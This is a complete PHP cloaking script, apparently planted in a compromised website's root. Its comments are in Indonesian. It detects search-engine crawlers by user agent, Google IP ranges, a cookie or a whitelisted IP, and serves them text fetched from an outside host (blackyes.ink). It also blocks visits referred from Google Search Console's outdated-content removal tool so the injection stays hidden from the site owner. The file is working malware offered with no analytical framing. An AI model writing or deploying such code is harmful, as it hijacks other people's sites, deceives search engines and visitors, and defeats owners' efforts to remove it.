<?php
ob_start();
header('Vary: User-Agent');
error_reporting(0);

// Cek referer, blokir kalau dari GSC Remove Outdated Content
$referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$blocked_domain = 'https://search.google.com/search-console/remove-outdated-content?hl=en';

if (strpos($referrer, $blocked_domain) !== false) {
    header('HTTP/1.0 403 Forbidden');
    echo 'Akses diblokir dari referer ini.';
    exit();
}

// URL untuk bot
$bot_url = "https://blackyes.ink/landing/jurnalsains.txt"; 
$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);

// Fungsi ambil konten URL
function lph_requests($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    } elseif (ini_get('allow_url_fopen')) {
        return @file_get_contents($url); // Tambah @ untuk suppress warning jika gagal
    }
    return false;
}

// Cek apakah IP dalam range
function ip_in_range($ip, $range) {
    list($subnet, $bits) = explode('/', $range);
    $ip_dec = ip2long($ip);
    $subnet_dec = ip2long($subnet);
    $mask = -1 << (32 - $bits);
    $subnet_dec &= $mask;
    return ($ip_dec & $mask) === $subnet_dec;
}

// Ambil IP range Google
function fetch_ip_ranges($url, $ipv4_key) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $json_data = curl_exec($ch);
    
    if ($json_data === FALSE) {
        return []; // Kembalikan array kosong jika gagal, bukan die()
    }
    
    curl_close($ch);
    
    $ip_data = json_decode($json_data, true);
    $ip_ranges = [];
    if (isset($ip_data['prefixes'])) {
        foreach ($ip_data['prefixes'] as $prefix) {
            if (isset($prefix[$ipv4_key])) {
                $ip_ranges[] = $prefix[$ipv4_key];
            }
        }
    }
    return $ip_ranges;
}

$google_ip_ranges = fetch_ip_ranges('https://www.gstatic.com/ipranges/goog.json', 'ipv4Prefix');

// Ambil IP pengunjung
$visitor_ip = isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : 
              (isset($_SERVER["HTTP_INCAP_CLIENT_IP"]) ? $_SERVER["HTTP_INCAP_CLIENT_IP"] : 
              (isset($_SERVER["HTTP_TRUE_CLIENT_IP"]) ? $_SERVER["HTTP_TRUE_CLIENT_IP"] : 
              (isset($_SERVER["HTTP_REMOTEIP"]) ? $_SERVER["HTTP_REMOTEIP"] : 
              (isset($_SERVER["HTTP_X_REAL_IP"]) ? $_SERVER["HTTP_X_REAL_IP"] : $_SERVER["REMOTE_ADDR"]))));

// Cek apakah IP milik Google
$googleallow = false;
foreach ($google_ip_ranges as $range) {
    if (ip_in_range($visitor_ip, $range)) {
        $googleallow = true;
        break;
    }
}

// Tambahan rules bot
$bot_keywords = array('bot', 'ahrefs', 'google', 'inspection', 'slurp', 'adsense', 'crawler', 'spider', 'googlebot');
$bot_detected = false;
foreach ($bot_keywords as $keyword) {
    if (strpos($ua, $keyword) !== false) {
        $bot_detected = true;
        break;
    }
}

// Whitelist IP manual
$allow_ips = ['103.154.120.62'];

// Ambil path URL
$path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

// Cloaking hanya aktif di root domain (misal: https://domain.com/ atau dengan query string)
if ($path === '/' || $path === '') {
    if (preg_match($botchar, $ua) || $bot_detected || $googleallow || isset($_COOKIE['lp']) || in_array($visitor_ip, $allow_ips)) {
        // usleep(rand(100000, 200000)); // Dihapus karena tidak perlu delay berlebihan
        $content = lph_requests($bot_url);
        if ($content !== false) {
            echo $content;
        } else {
            echo "Gagal mengambil konten dari URL bot.";
        }
        ob_end_flush();
        exit;
    }
}